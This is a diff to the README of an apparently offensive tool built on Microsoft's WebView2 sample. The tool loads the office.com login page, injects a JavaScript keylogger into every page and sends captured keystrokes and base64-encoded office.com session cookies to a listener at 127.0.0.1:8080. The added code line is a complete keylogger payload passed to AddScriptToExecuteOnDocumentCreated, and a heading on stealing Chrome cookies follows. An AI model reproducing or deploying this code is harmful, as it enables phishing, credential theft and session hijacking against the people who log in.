@@ -20,14 +20,14 @@ This code is a modified version of <a href="https://github.com/MicrosoftEdge/Web
 
 **Tested on Windows 10 & 11.**
 
-When the binary is executed ```https://office.com/login``` is loaded up. Upon the user successfully authenticating the cookies for ```www.office.com``` are base64-encoded and sent to ```127.0.0.1:8080``` via an HTTP GET request.
+When the binary is executed ```https://office.com/login``` is loaded up. A JavaScript keylogger is injected into every page and keystrokes are sent to ```http://127.0.0.1:8080```. Furthermore, upon the user successfully authenticating the cookies for ```www.office.com``` are base64-encoded and sent to ```http://127.0.0.1:8080``` via an HTTP GET request.
 
-# Injecting JavaScript
+# Modifying JavaScript
 
-If you'd like to inject JavaScript on every page that loads then add the code shown below at ```line 1095``` in ```AppWindow.cpp```.
+If you'd like to modify the JavaScript the code that needs to be changed is shown below at ```line 1096``` in ```AppWindow.cpp```.
 
 ```
-coreWebView2->AddScriptToExecuteOnDocumentCreated(L"alert(window.document.URL);",nullptr);
+coreWebView2->AddScriptToExecuteOnDocumentCreated(L"var link = \"http://127.0.0.1:8080/keylog?k=\";var l = \"\";document.onkeypress = function (e){l += e.key;var req = new XMLHttpRequest();req.open(\"GET\",link.concat(l), true);req.send();}", nullptr);
 ```
 
 # Stealing Chrome Cookies
